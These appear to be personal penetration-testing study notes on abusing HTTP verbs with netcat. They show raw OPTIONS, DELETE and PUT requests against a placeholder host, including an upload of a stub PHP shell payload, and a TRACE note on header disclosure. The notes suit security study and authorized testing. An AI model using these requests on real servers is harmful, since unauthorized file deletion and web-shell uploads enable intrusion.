### General Notes

> Exploiting [[HTTP]] verbs.
> Check the resulting [[HTTP]] response to see effect of exploitation.
> Done using [[netcat]]
---

### Enumerate available verbs

> Using `netcat`, connect and then send a request using the `options` verb.
```
nc example.site 80
OPTIONS / HTTP/1.1
```
> Similar to the usage of `netcat` in [[Web Application Fingerprinting]].

---

### Exploit `DELETE`

> Using `netcat`, connect and then send a request using the `delete` verb, with the path to the file specified.
```
nc example.site 80
DELETE /path/to/resource.php HTTP/1.1
```
> Similar to the usage of `netcat` in [[Web Application Fingerprinting]].

---

### Exploit `PUT`

> Must know the size of the file to be uploaded. Use the `wc -m <filename>` to get size in bytes of the file.

> Using `netcat`, connect and then send a request using the `PUT` verb, with the path to the file specified.
```
nc example.site 80
PUT /payload.php HTTP/1.1
Content-type: text/html
Content-length: <size-in-bytes>

<?php shell-code ?>
```

---

### Exploit `TRACE`

> Used in [[Information Disclosure]].
> The web server responds with the exact request that was sent.
> Can be used to test for the hidden server side [[HTTP]] headers.
